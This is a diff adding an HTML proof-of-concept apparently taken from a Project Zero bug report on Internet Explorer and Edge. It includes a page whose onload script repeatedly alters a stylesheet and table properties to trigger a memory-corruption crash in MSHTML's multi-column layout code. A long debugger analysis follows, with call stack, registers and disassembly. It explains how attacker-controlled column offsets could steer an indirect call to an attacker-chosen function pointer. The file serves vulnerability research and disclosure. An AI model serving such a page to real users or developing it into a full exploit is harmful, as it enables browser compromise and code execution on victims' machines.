@@ -1,0 +1,108 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1011
+
+PoC:
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<style>
+.class1 { float: left; column-count: 5; }
+.class2 { column-span: all; columns: 1px; }
+table {border-spacing: 0px;}
+</style>
+<script>
+function boom() {
+  document.styleSheets[0].media.mediaText = "aaaaaaaaaaaaaaaaaaaa";
+  th1.align = "right";
+}
+</script>
+<body onload="setInterval(boom,100)">
+<table cellspacing="0">
+<tr class="class1">
+<th id="th1" colspan="5" width=0></th>
+<th class="class2" width=0><div class="class2"></div></th>
+
+<!--
+Note: The analysis below is based on an 64-bit IE (running in single process mode) running on Windows Server 2012 R2. Microsoft Symbol Server has been down for several days and that's the only configuration for which I had up-to-date symbols. However Microsoft Edge and 32-bit IE 11 should behave similarly.
+
+The PoC crashes in
+MSHTML!Layout::MultiColumnBoxBuilder::HandleColumnBreakOnColumnSpanningElement
+when reading from address 0000007800000070
+
+(5fc.8a4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+MSHTML!Layout::MultiColumnBoxBuilder::HandleColumnBreakOnColumnSpanningElement+0xa4:
+00007ffe`8f330a59 48833800        cmp     qword ptr [rax],0 ds:00000078`00000070=????????????????
+
+With the following call stack:
+
+Child-SP          RetAddr           Call Site
+00000071`0e75b960 00007ffe`8f3f1836 MSHTML!Layout::MultiColumnBoxBuilder::HandleColumnBreakOnColumnSpanningElement+0xa4
+00000071`0e75b9c0 00007ffe`8e9ba9df MSHTML!`CBackgroundInfo::Property<CBackgroundImage>'::`7'::`dynamic atexit destructor for 'fieldDefaultValue''+0x641fc
+00000071`0e75ba50 00007ffe`8f05393f MSHTML!Layout::FlowBoxBuilder::MoveToNextPosition+0x1b5
+00000071`0e75bb10 00007ffe`8f0537e9 MSHTML!Layout::LayoutBuilder::EnterBlock+0x147
+00000071`0e75bbb0 00007ffe`8f278243 MSHTML!Layout::LayoutBuilder::Move+0x77
+00000071`0e75bbe0 00007ffe`8e9b364f MSHTML!Layout::LayoutBuilderDriver::BuildPageLayout+0x19d
+00000071`0e75bcc0 00007ffe`8e9b239c MSHTML!Layout::PageCollection::FormatPage+0x1f3
+00000071`0e75be60 00007ffe`8e9affd1 MSHTML!Layout::PageCollection::LayoutPagesCore+0x38c
+00000071`0e75c030 00007ffe`8e9b099b MSHTML!Layout::PageCollection::LayoutPages+0x102
+00000071`0e75c090 00007ffe`8e9aff45 MSHTML!CMarkupPageLayout::CalcPageLayoutSize+0x50b
+00000071`0e75c220 00007ffe`8ea74047 MSHTML!CMarkupPageLayout::CalcTopLayoutSize+0xd5
+00000071`0e75c2f0 00007ffe`8ea73c95 MSHTML!CMarkupPageLayout::DoLayout+0xf7
+00000071`0e75c360 00007ffe`8e98066d MSHTML!CView::ExecuteLayoutTasks+0x17c
+00000071`0e75c3f0 00007ffe`8e983b7a MSHTML!CView::EnsureView+0x43f
+00000071`0e75c4d0 00007ffe`8e97f82b MSHTML!CPaintController::EnsureView+0x58
+00000071`0e75c500 00007ffe`8ea2e47e MSHTML!CPaintBeat::OnBeat+0x41b
+00000071`0e75c580 00007ffe`8ea2e414 MSHTML!CPaintBeat::OnPaintTimer+0x5a
+00000071`0e75c5b0 00007ffe`8f2765dc MSHTML!CContainedTimerSink<CPaintBeat>::OnTimerMethodCall+0xdb
+00000071`0e75c5e0 00007ffe`8e969d52 MSHTML!GlobalWndOnPaintPriorityMethodCall+0x1f7
+00000071`0e75c690 00007ffe`afc13fe0 MSHTML!GlobalWndProc+0x1b8
+00000071`0e75c710 00007ffe`afc13af2 USER32!UserCallWinProcCheckWow+0x1be
+00000071`0e75c7e0 00007ffe`afc13bbe USER32!DispatchClientMessage+0xa2
+00000071`0e75c840 00007ffe`b2352524 USER32!_fnDWORD+0x3e
+00000071`0e75c8a0 00007ffe`afc1cfaa ntdll!KiUserCallbackDispatcherContinue
+00000071`0e75c928 00007ffe`afc1cfbc USER32!ZwUserDispatchMessage+0xa
+00000071`0e75c930 00007ffe`95d1bb28 USER32!DispatchMessageWorker+0x2ac
+00000071`0e75c9b0 00007ffe`95d324cb IEFRAME!CTabWindow::_TabWindowThreadProc+0x555
+00000071`0e75fc30 00007ffe`aa81572f IEFRAME!LCIETab_ThreadProc+0x3a3
+00000071`0e75fd60 00007ffe`9594925f iertutil!Microsoft::WRL::ActivationFactory<Microsoft::WRL::Implements<Microsoft::WRL::FtmBase,Windows::Foundation::IUriRuntimeClassFactory,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil>,Windows::Foundation::IUriEscapeStatics,Microsoft::WRL::Details::Nil,0>::GetTrustLevel+0x5f
+00000071`0e75fd90 00007ffe`b1d313d2 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x9f
+00000071`0e75fde0 00007ffe`b22d54e4 KERNEL32!BaseThreadInitThunk+0x22
+00000071`0e75fe10 00000000`00000000 ntdll!RtlUserThreadStart+0x34
+
+And the following register values:
+
+rax=0000007800000070 rbx=0000000000000064 rcx=0000007800000050
+rdx=0000000000000048 rsi=00000079164a8f01 rdi=00007ffe8f9f81b0
+rip=00007ffe8f330a59 rsp=000000710e75b960 rbp=0000007916492fe8
+ r8=0000007916490ec0  r9=000000710e75b980 r10=00000079164a8f30
+r11=000000710e75b928 r12=000000710e75c000 r13=0000007916450fc8
+r14=000000791648ec60 r15=0000007911ec9f50
+
+Edge should crash when reading the same address while 32-bit IE tab process should crash in the same place but when reading a lower address.
+
+Let's take a look at the code around the rip of the crash.
+
+00007ffe`8f330a51 488bcd          mov     rcx,rbp
+00007ffe`8f330a54 e8873c64ff      call    MSHTML!Layout::Patchable<Layout::PatchableArrayData<Layout::MultiColumnBox::SMultiColumnBoxItem> >::Readable (00007ffe`8e9746e0)
+00007ffe`8f330a59 48833800        cmp     qword ptr [rax],0 ds:00000078`00000070=????????????????
+00007ffe`8f330a5d 743d            je      MSHTML!Layout::MultiColumnBoxBuilder::HandleColumnBreakOnColumnSpanningElement+0xe7 (00007ffe`8f330a9c)
+00007ffe`8f330a5f 488bcd          mov     rcx,rbp
+00007ffe`8f330a62 e8793c64ff      call    MSHTML!Layout::Patchable<Layout::PatchableArrayData<Layout::MultiColumnBox::SMultiColumnBoxItem> >::Readable (00007ffe`8e9746e0)
+00007ffe`8f330a67 488b30          mov     rsi,qword ptr [rax]
+00007ffe`8f330a6a 488b06          mov     rax,qword ptr [rsi]
+00007ffe`8f330a6d 488bb848030000  mov     rdi,qword ptr [rax+348h]
+00007ffe`8f330a74 488bcf          mov     rcx,rdi
+00007ffe`8f330a77 ff155b95d700    call    qword ptr [MSHTML!_guard_check_icall_fptr (00007ffe`900a9fd8)]
+00007ffe`8f330a7d 488bce          mov     rcx,rsi
+00007ffe`8f330a80 ffd7            call    rdi
+
+On 00007ffe`8f330a51 rxc is read from rbp and MSHTML!Layout::Patchable<Layout::PatchableArrayData<Layout::MultiColumnBox::SMultiColumnBoxItem> >::Readable is called which sets up rax. rcx is supposed to point to another object type, but in the PoC it points to an array of 32-bit integers allocated in Array<Math::SLayoutMeasure>::Create. This array stores offsets of table columns and the values can be controlled by an attacker (with some limitations).
+
+On 00007ffe`8f330a59 the crash occurs because rax points to uninitialized memory.
+
+However, an attacker can affect rax by modifying table properties such as border-spacing and the width of the firs th element. Let's see what happens if an attacker can point rax to the memory he/she controls.
+
+Assuming an attacker can pass a check on line 00007ffe`8f330a59, MSHTML!Layout::Patchable<Layout::PatchableArrayData<Layout::MultiColumnBox::SMultiColumnBoxItem> >::Readable is called again with the same arguments. After that, through a series of dereferences starting from rax, a function pointer is obtained and stored in rdi. A CFG check is made on that function pointer and, assuming it passes, the attacker-controlled function pointer is called on line 00007ffe`8f330a80.
+-->
